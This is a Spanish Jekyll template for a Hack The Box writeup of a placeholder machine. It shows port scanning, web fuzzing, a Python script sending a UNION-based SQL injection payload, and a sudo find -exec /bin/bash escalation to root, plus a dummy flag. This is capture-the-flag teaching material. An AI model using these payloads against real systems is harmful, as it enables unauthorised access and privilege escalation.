---
# COMO USAR ESTA PLANTILLA (las lineas con # no se publican)
# 1. Copiala a _posts/AAAA-MM-DD-nombre.md   (ej. _posts/2026-11-05-machine-ejemplo.md)
# 2. Cambia title, tags, description e image.
#    Etiquetas: hackthebox, tryhackme, otros, red team, blue team, Certificaciones,
#    repositorios, libros, descargas, articulos, workspace, labs
# 3. Lo que va antes de la marca "more" (mas abajo) sale en la portada.
# 4. Las imagenes van en assets/img/posts/<nombre>/
# 5. Avisos: escribe "> texto" y debajo {: .tip}  {: .warning}  {: .danger}  {: .flag}
# 6. Si actualizas una entrada vieja y quieres que suba a "updates.log" de la portada,
#    agrega la linea:  actualizado: 2026-11-05 18:30:00 -0500   (fecha del cambio)
title: "Machine Ejemplo | Hack The Box | Medium"
tags: [hackthebox]
description: "Writeup de la máquina Ejemplo de Hack The Box: enumeración, explotación y escalada de privilegios."
image: /assets/img/posts/ejemplo/portada.png
---

![Machine Ejemplo](/assets/img/posts/ejemplo/portada.png)

Writeup de la máquina **Ejemplo**: un servicio web vulnerable a SQLi que nos da acceso
inicial y una mala configuración de `sudo` para escalar a root.

<!--more-->

| Dato        | Valor            |
|-------------|------------------|
| OS          | Linux            |
| Dificultad  | Medium           |
| IP          | 10.10.11.XX      |
| Técnicas    | SQLi, sudo abuse |

## Enumeración

Escaneo completo de puertos:

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.XX -oG allPorts
nmap -sCV -p22,80 10.10.11.XX -oN targeted
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    nginx 1.18.0
```

### Fuzzing web

```bash
gobuster dir -u http://10.10.11.XX -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50
```

> El parámetro `id` de `/item.php` refleja errores de MySQL.
{: .tip}

## Explotación

```python
import requests

url = "http://10.10.11.XX/item.php"
payload = "1' UNION SELECT 1,user(),3-- -"
r = requests.get(url, params={"id": payload}, timeout=10)
print(r.status_code, len(r.text))
```

> No lances `sqlmap --risk 3` contra máquinas compartidas: puedes romperla a otros jugadores.
{: .warning}

## Escalada de privilegios

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/bash \; -quit
```

> root.txt → `e3b0c44298fc1c149afbf4c8996fb924`
{: .flag}

---

**Lecciones:** sanitizar entradas y revisar siempre `sudo -l` contra [GTFOBins](https://gtfobins.github.io/).
